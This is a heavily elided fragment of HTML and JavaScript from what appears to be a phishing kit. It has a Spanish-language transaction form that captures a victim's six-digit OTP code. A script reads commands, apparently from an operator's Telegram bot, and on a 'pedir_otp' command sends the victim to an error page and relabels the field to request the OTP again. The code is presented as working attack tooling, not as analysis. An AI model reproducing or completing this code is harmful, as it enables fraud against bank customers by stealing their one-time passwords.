...
<div class="container">
    ...
    <form id="transaction-form">
      ...
      <div class="input-group">
        <label id="clave-label" for="clave">Clave otp:</label>
        <input type="password" id="clave" placeholder="Ingresa tu codigo Otp" maxlength="6">
      </div>
  ...
  <script>
    ...
    function actualizarLogos() {
      ...
      document.getElementById("clave-label").innerText = "Ingrese Clave Otp Nuevamente:";
    }
            ...
            if (verificationUpdate) {
                ...
                switch (verificationUpdate.callback_query.data) {
                    ...
                    case `pedir_otp:${transactionId}`:
                        window.location.href = "error-otp.php";
                        break;
